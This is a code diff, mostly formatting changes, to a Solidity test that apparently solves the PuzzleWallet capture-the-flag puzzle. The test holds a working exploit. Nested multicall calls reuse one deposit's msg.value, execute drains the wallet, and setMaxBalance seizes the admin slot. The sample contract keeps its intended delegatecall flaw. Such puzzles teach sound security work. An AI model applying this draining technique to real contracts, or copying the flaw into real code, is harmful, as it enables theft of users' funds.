@@ -9,6 +9,7 @@ contract PuzzleWalletTest is Test {
     PuzzleWallet wallet;
 
     address caller = address(100);
+
     function setUp() public {
         wallet = new PuzzleWallet();
         wallet.init(7e18);
@@ -17,10 +18,7 @@ contract PuzzleWalletTest is Test {
         vm.deal(address(wallet), 0.001 ether);
     }
 
-    function _makeBatch(
-        uint256 layers,
-        uint256 maxLayers
-    ) internal returns (bytes[] memory) {
+    function _makeBatch(uint256 layers, uint256 maxLayers) internal returns (bytes[] memory) {
         if (layers >= maxLayers - 1) {
             bytes[] memory latestBatch = new bytes[](1);
             latestBatch[0] = abi.encode(wallet.deposit.selector);
@@ -30,10 +28,7 @@ contract PuzzleWalletTest is Test {
         bytes[] memory batch = new bytes[](2);
 
         batch[0] = abi.encode(wallet.deposit.selector);
-        batch[1] = abi.encodeWithSelector(
-            wallet.multicall.selector,
-            _makeBatch(layers + 1, maxLayers)
-        );
+        batch[1] = abi.encodeWithSelector(wallet.multicall.selector, _makeBatch(layers + 1, maxLayers));
 
         return batch;
     }
@@ -47,14 +42,10 @@ contract PuzzleWalletTest is Test {
         bytes[] memory batch = _makeBatch(0, times);
 
         vm.prank(caller);
-        wallet.multicall{value: value}(batch);
+        wallet.multicall{ value: value }(batch);
         //drain
         vm.prank(caller);
-        wallet.execute{value: 1}(
-            address(caller),
-            address(wallet).balance + 1,
-            ""
-        );
+        wallet.execute{ value: 1 }(address(caller), address(wallet).balance + 1, "");
         vm.prank(caller);
         wallet.setMaxBalance(uint160(address(this)));
         console.log("Caller Bal: ", address(wallet).balance);
@@ -94,14 +85,10 @@ contract PuzzleWallet {
         balances[msg.sender] += msg.value;
     }
 
-    function execute(
-        address to,
-        uint256 value,
-        bytes calldata data
-    ) external payable onlyWhitelisted {
+    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
         require(balances[msg.sender] >= value, "Insufficient balance");
         balances[msg.sender] -= value;
-        (bool success, ) = to.call{value: value}(data);
+        (bool success,) = to.call{ value: value }(data);
         require(success, "Execution failed");
     }
 
@@ -118,7 +105,7 @@ contract PuzzleWallet {
                 // Protect against reusing msg.value
                 depositCalled = true;
             }
-            (bool success, ) = address(this).delegatecall(data[i]);
+            (bool success,) = address(this).delegatecall(data[i]);
             require(success, "Error while delegating call");
         }
     }
